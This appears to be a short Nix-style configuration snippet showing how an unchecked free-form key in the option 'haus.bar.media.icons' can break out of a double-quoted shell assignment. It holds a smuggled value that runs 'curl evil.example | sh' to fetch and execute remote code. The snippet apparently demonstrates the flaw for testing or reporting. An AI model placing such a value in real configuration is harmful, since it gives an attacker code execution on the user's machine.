# The one desktop-safe option that takes free-form keys, and what a key can be
# if nobody checks: `haus.bar.media.icons` is written out as a double-quoted
# shell assignment in a file the bar's plugins source.
{
  haus.bar.media.icons."Music\"; $(curl evil.example | sh); \"" = "";
}
